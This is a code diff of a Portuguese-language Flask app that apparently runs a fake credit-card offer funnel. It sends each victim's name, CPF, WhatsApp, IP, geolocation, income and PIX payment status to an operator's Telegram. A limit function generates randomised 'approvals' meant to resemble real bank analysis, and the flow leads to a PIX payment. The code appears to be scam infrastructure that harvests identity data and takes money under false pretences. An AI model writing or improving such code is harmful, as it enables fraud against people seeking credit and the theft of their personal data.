@@ -419,15 +419,15 @@ def validate_cpf(cpf: str) -> bool:
 
 
 def send_telegram_notify(session_id, event_type="ENTRY"):
-    """Envia notificação Telegram síncrona — chamada dentro do request context Flask."""
+    """Envia notificação Telegram síncrona com estrutura aprimorada."""
     try:
         import requests as _rq
+        import re
 
         db = get_db()
         cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
         cfg = {r["key"]: r["value"] for r in cfg_rows}
 
-        # ── Token do Bot ──────────────────────────────────────────────────────
         bot_token = (
             cfg.get("telegram_token")
             or os.environ.get("TELEGRAM_BOT_TOKEN")
@@ -437,13 +437,11 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             log.warning("[TG] Sem bot_token — notificação ignorada (event=%s)", event_type)
             return
 
-        # ── session_id vazio → ignora ─────────────────────────────────────────
         if not session_id:
             return
 
         lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
         if not lead:
-            log.warning("[TG] Lead não encontrado para session_id=%s", session_id)
             return
 
         pay = db.execute(
@@ -451,7 +449,6 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             (session_id,)
         ).fetchone()
 
-        # ── Resolve destino ───────────────────────────────────────────────────
         supreme_id = (
             cfg.get("admin_chat_id")
             or cfg.get("supreme_admin_id")
@@ -459,6 +456,7 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             or os.environ.get("ID_ADMIN_SUPREMO")
             or os.environ.get("ADMIN_CHAT_ID")
         )
+        
         log_channel = None
         if event_type in ["PIX_PAID", "PIX_GENERATED"]:
             log_channel = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
@@ -468,12 +466,11 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
             log_channel = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
 
         if not supreme_id and not log_channel:
-            log.warning("[TG] Nenhum destino configurado — supreme_id=%s log=%s", supreme_id, log_channel)
             return
 
         # ── Geolocalização ────────────────────────────────────────────────────
         geo_link = "N/A"
-        if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost"]:
+        if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost", "::1"]:
             try:
                 ip_data = _rq.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
                 if ip_data.get("status") == "success":
@@ -500,42 +497,52 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         elif event_type == "PIX_GENERATED": titulo = "⏳ PIX GERADO"
         elif event_type == "PIX_PAID":      titulo = "✅ PAGAMENTO CONFIRMADO"
         elif "ABANDONO" in event_type:      titulo = "🚨 LEAD ABANDONOU O FUNIL"
+        elif str(event_type).startswith("STEP_ACTION"): titulo = f"🔄 ETAPA CONCLUÍDA"
 
-        texto  = f"{icon} <b>{titulo}</b> {icon}\n\n"
+        # Formatação Bem Estruturada para o Admin Supremo
+        texto = f"{icon} <b>{titulo}</b> {icon}\n"
+        texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
         texto += f"🕒 <b>Data/Hora:</b> {agora}\n"
         texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\n"
         texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
         if lead.get("whatsapp"):
             cwa = re.sub(r"\D", "", lead["whatsapp"])
-            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{cwa}'>{lead['whatsapp']}</a> ✅\n"
+            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{cwa}'>{lead['whatsapp']}</a> ✅ (Validado)\n"
+        
+        texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        texto += f"🌐 <b>DADOS DE REDE E ACESSO</b>\n"
         texto += f"💻 <b>Dispositivo:</b> {lead.get('device_brand') or 'Desconhecido'}\n"
         texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n"
         if geo_link != "N/A":
             texto += f"📍 <b>Localização:</b> {geo_link}\n"
 
-        texto += f"\n📊 <b>STATUS DO FUNIL:</b>\n"
+        texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        texto += f"📊 <b>STATUS DO FUNIL</b>\n"
         texto += f"✅ <b>Acesso Inicial:</b> Concluído\n"
         if lead["cpf"]:           texto += f"✅ <b>CPF:</b> {lead['cpf']}\n"
         if lead["renda"]:         texto += f"✅ <b>Renda:</b> R$ {lead['renda']}\n"
         if lead["tipo_renda"]:    texto += f"✅ <b>Ocupação:</b> {lead['tipo_renda']}\n"
         if lead["motivo_credito"]: texto += f"✅ <b>Motivo:</b> {lead['motivo_credito']}\n"
         if lead["dia_vencimento"]: texto += f"✅ <b>Vencimento:</b> Dia {lead['dia_vencimento']}\n"
-        if lead["limite_aprovado"]: texto += f"🎯 <b>Limite:</b> R$ {lead['limite_aprovado']}\n"
+        if lead["limite_aprovado"]: texto += f"🎯 <b>Limite Aprovado:</b> R$ {lead['limite_aprovado']}\n"
         if lead["card_style"]:
-            texto += f"\n💳 <b>CARTÃO:</b> {lead['card_style']} ({lead['card_color']})\n"
+            texto += f"💳 <b>Cartão Escolhido:</b> {lead['card_style']} ({lead['card_color']})\n"
+        
+        if str(event_type).startswith("STEP_ACTION"):
+            texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            texto += f"📍 <b>ÚLTIMA AÇÃO:</b>\n{event_type.replace('STEP_ACTION:', '').strip()}\n"
+
         if pay:
-            texto += f"\n💸 <b>PAGAMENTO:</b>\n"
+            texto += f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            texto += f"💸 <b>DADOS DE COMPRA / SAÍDA</b>\n"
             texto += f"💵 <b>Valor:</b> R$ {pay['amount']}\n"
             st = lead["pix_status"]
-            texto += f"🚦 <b>Status:</b> {'✅ PAGO!' if st in ['paid','completed'] else '⏳ AGUARDANDO'}\n"
-            texto += f"🆔 <b>ID:</b> <code>{pay['payment_id']}</code>\n"
-
+            texto += f"🚦 <b>Status do PIX:</b> {'✅ PAGO!' if st in ['paid','completed'] else '⏳ AGUARDANDO'}\n"
+            texto += f"🆔 <b>ID da Transação:</b> <code>{pay['payment_id']}</code>\n"
+            
         base_payload = {"text": texto, "parse_mode": "HTML", "disable_web_page_preview": True}
 
-        if not log_channel:
-            log_channel = supreme_id
-
-        # ── Envia para canal de log ───────────────────────────────────────────
+        # ── Envia para canal de log (com edição se for a mesma mensagem) ──────
         if log_channel:
             lp = dict(base_payload, chat_id=log_channel)
             msg_id  = lead.get("tg_message_id")
@@ -555,17 +562,15 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                     db.execute("UPDATE leads SET tg_message_id=?, tg_chat_id=? WHERE session_id=?",
                                (rj["result"]["message_id"], log_channel, session_id))
                     db.commit()
-                else:
-                    log.warning("[TG] Erro log_channel %s: %s", log_channel, rj.get("description"))
 
-        # ── Envia para admin supremo ──────────────────────────────────────────
-        if supreme_id and str(supreme_id) != str(log_channel):
+        # ── Envia SEMPRE para admin supremo como nova mensagem (Histórico) ────
+        if supreme_id:
             sp = dict(base_payload, chat_id=supreme_id)
             r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=sp, timeout=4)
             if not r2.json().get("ok"):
                 log.warning("[TG] Erro supreme_id %s: %s", supreme_id, r2.json().get("description"))
             else:
-                log.info("[TG] '%s' enviado → %s", event_type, supreme_id)
+                log.info("[TG] '%s' enviado → supremo", event_type)
 
     except Exception as e:
         log.error("[TG] send_telegram_notify ERRO: %s", e, exc_info=True)
@@ -677,15 +682,21 @@ def _send_telegram_report_inner(session_id, is_paid=False):
 
 def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     import random
+    import os
     
-    # 1. Parsing avançado da Renda (os botões enviam 1000, 2000, 4000, 8000)
+    # 1. Parsing avançado da Renda
     try:
-        r_val = float(renda.replace("R$", "").replace(".", "").replace(",", ".").strip())
+        clean_renda = str(renda).replace("R$", "").strip()
+        if "," in clean_renda:
+            clean_renda = clean_renda.replace(".", "").replace(",", ".")
+        else:
+            pass 
+        r_val = float(clean_renda)
     except:
         r_val = 1500.0
 
-    # Base de cálculo reduzida para valores mais realistas
-    base_limite = r_val * random.uniform(0.08, 0.25)
+    # Base de cálculo 15% a 25% da renda
+    base_limite = r_val * random.uniform(0.15, 0.25)
     
     tipo = tipo_renda.lower()
     motivo_lower = motivo.lower()
@@ -693,50 +704,47 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
     # 2. Multiplicador de Estabilidade Empregatícia
     estabilidade = 1.0
     if any(x in tipo for x in ["servidor", "público", "aposentado"]):
-        estabilidade = 1.5  # Alta estabilidade = Risco Menor
+        estabilidade = 1.3
     elif any(x in tipo for x in ["clt", "carteira assinada"]):
-        estabilidade = 1.2  # Estabilidade média
+        estabilidade = 1.1
     elif any(x in tipo for x in ["empresário", "empreendedor", "cnpj", "dono"]):
-        estabilidade = 1.0  # Boa renda, mas variável
+        estabilidade = 1.0
     elif any(x in tipo for x in ["autônomo", "freelancer", "informal"]):
-        estabilidade = 0.7  # Risco maior
+        estabilidade = 0.8
     elif any(x in tipo for x in ["estudante", "desempregado"]):
-        estabilidade = 0.3  # Risco muito alto
-        base_limite = min(base_limite, 500) # trava estrita para desempregados
+        estabilidade = 0.4
+        base_limite = min(base_limite, 300)
 
-    # 3. Análise de Risco pelo Motivo do Crédito
+    # 3. Análise de Risco pelo Motivo
     fator_risco = 1.0
     if "viagem" in motivo_lower:
         fator_risco = 1.1  
-    elif "específica" in motivo_lower:
-        fator_risco = 1.0  
     elif "organizar" in motivo_lower or "dívida" in motivo_lower:
-        fator_risco = 0.6   # Sinal vermelho forte (corta quase pela metade)
+        fator_risco = 0.6
     
-    # Cálculo final do Limite
+    # Cálculo final
     limite = base_limite * estabilidade * fator_risco
     
-    # Teto máximo rigoroso de acordo com a renda
+    # TETO MÁXIMO RIGOROSO PROPORCIONAL À RENDA
+    # Para evitar liberação de 12.000 para quem recebe 1.000
     if r_val <= 1000:
-        # Se ganha 1000, limite não deve passar muito de 150 a 300
-        limite = min(limite, random.uniform(150, 300))
+        limite = min(limite, 350)
     elif r_val <= 2000:
-        # Se ganha 2000, limite não deve passar de 400 a 700
-        limite = min(limite, random.uniform(400, 700))
+        limite = min(limite, 700)
     elif r_val <= 4000:
-        limite = min(limite, random.uniform(800, 1500))
+        limite = min(limite, 1500)
     else:
-        # Acima de 4000, teto máximo fixado no sistema
-        limite = min(limite, random.uniform(1500, 2800))
+        # Se for renda super alta, ainda sim travamos num máximo razoável
+        limite = min(limite, r_val * 0.4)
+        limite = min(limite, 6000)
         
-    # Limites Hardcodes de Segurança lógicos
     if limite < 150: 
-        limite = random.choice([150, 200])  # Limite mínimo absoluto
+        limite = 150.0
         
-    # Arredondamento charmoso para parecer análise de banco real (finais em 00 ou 50)
     limite = round(limite / 50) * 50
+    if limite < 150:
+        limite = 150.0
     
-    # Definição de Tier para uso futuro
     if limite < 1000:
         tier = "Bronze"
     elif limite < 3000:
